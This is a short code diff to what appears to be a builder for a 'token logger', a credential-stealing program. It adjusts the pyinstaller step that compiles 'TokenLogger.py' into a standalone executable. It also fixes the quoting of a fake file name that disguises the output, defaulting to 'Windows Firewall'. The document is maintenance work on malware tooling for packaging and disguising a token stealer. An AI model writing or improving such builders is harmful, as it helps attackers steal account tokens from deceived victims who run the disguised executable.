@@ -89,7 +89,7 @@ def build():
     title()
     print(Fore.GREEN + Style.BRIGHT + "[!] Attempting to compile token logger to executable.")
     with alive_bar(4, stats=False, enrich_print=False, spinner="classic") as barr:
-        compileFile = subprocess.getoutput('pyinstaller --noconfirm --onefile --console --clean --noupx  "result/TokenLogger.py"')
+        compileFile = subprocess.getoutput('pyinstaller --noconfirm --onefile --console --clean --noupx --exclude-module _bootlocale "result/TokenLogger.py"')
         with open("log.txt", "w", encoding="utf-8") as log:
             log.write(compileFile)
             log.close()
@@ -253,7 +253,7 @@ def start():
     if fakeFileName == "":
         code += "FakeFileName = 'Windows Firewall'\n"
     else:
-        code += f"FakeFileName = '{fakeFileName}\n'"
+        code += f"FakeFileName = '{fakeFileName}'\n"
     with open("assets/end.txt", "r", encoding="utf8") as endFile:
         endOfCode = endFile.read()
     code += endOfCode
